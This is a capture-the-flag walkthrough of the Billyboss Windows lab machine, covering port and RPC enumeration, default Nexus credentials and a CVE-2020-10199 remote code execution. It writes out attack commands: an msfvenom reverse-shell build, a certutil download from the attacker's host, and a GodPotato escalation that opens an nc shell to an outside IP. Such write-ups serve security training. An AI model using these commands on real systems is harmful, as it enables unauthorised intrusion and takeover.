# Billyboss

## Intro

Billyboss is a 'get to work' intermediate windows machine from offsec proving grounds.

## Enum  

Nmap scan of ports 0 - 15000.  

```
Host: 192.168.57.61 ()  Ports: 0/filtered/tcp//
21/open/tcp/ftp/Microsoft ftpd
80/open/tcp/http/Microsoft IIS httpd 10.0
135/open/tcp/msrpc/Microsoft Windows RPC
139/open/tcp/netbios-ssn/Microsoft Windows netbios-ssn
445/open/tcp/microsoft-ds?/
5040/open/tcp/unknown/
8081/open/tcp/http/Jetty 9.4.18.v20190429
```  

Nmap udp scan.  

```
137/netbios-ns
138/netbios-dgm
500/isakmp
1900/upnp
4500/nat-t-ike
5353/zeroconf
```  

Nmap stealth scan.  

```
21/ftp
80/http
135/msrpc
139/netbios-ssn
445/microsoft-ds
5040/unknown
8081/blackice-icecap
49664/
49665/
49666/
49667/
49668/
49669/
```

Enum smb services.  

`8081/tcp open  blackice-icecap`  

## UDP services.  

137 netbios-ns is a name service that supplies netbios names to the receiving machine.  
138 datagram exchange, non connection file sharing.  
500 is used by the Internet key exchange (IKE) that occurs during the establishment of secure VPN tunnels  
1900 Universal Plug N' Play (UPnP) devices to receive broadcasted messages from other UPnP devices  
4500 internet key exchange  
5353 zero-configuration protocol with dns-like commands.



## rpc  

Using rpcdump.py  

Protocols.  

```
MSDTC Connection Manager
EventLog Remoting Protocol 
Firewall and Advanced Security Protocol 
Remote Shutdown Protocol 
Security Account Manager (SAM) Remote Protocol 
Service Control Manager Remote Protocol
Task Scheduler Service Remoting Protocol
```  

Provider.  

```
BFE.DLL 
dhcpcsvc6.dll 
dhcpcsvc.dll 
FwRemoteSvr.dll 
IKEEXT.DLL 
iphlpsvc.dll 
MPSSVC.dll 
msdtcprx.dll 
nrpsrv.dll 
nsisvc.dll 
pcasvc.dll 
samsrv.dll 
schedsvc.dll 
services.exe 
srvsvc.dll 
ssdpsrv.dll 
sysmain.dll 
sysntfy.dll 
taskcomp.dll 
wbiosrvc.dll 
wevtsvc.dll 
wininit.exe 
winlogon.exe 
wscsvc.dll
```  

## http port 80  

This port has a service running on it called baGet, which is a lightweight nuGet server.  

## Nexus repository manager - port 8081  

Using the following username and password to authenticate.  

`nexus:nexus`  

Finding a rce python script on exploitDB with the following cve.  

`CVE-2020-10199`  

After testing the exploit with the ping command, which did work, I tried a powershell reverse shell which did not work. Looking at the error, I think it might be the parenthesis and brackets mangling. After trying the command in base 64 it still did not work. Trying a file upload.  

Creating a reverse shell exe.  

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.54 LPORT=21 -f exe > /home/kali/shell.exe`  

Getting the file from my local machine with the following command.  

`cmd.exe /c certutil.exe -f -urlcache -split http://192.168.49.54:8000/shell.exe c:/windows/temp/shell.exe`  

Executing the shell file with the following command, and getting a shell back.  

`cmd.exe /c c:/windows/temp/shell.exe`  

## PrivEsc  

Listing the users directory.  

```
Administrator
BaGet
nathan
```  

This build is vuln with GodPotato and seImpersonate token.  

`.\potato.exe -cmd 'c:\Users\nathan\Nexus\nexus-3.21.0-05\nc64.exe 192.168.45.167 80 -e cmd.exe'`

This would not run in windows temp folder only nathans folder, nc is used to keep the process from exiting.  

GodPotato can be found at.  

`https://github.com/BeichenDream/GodPotato/releases`
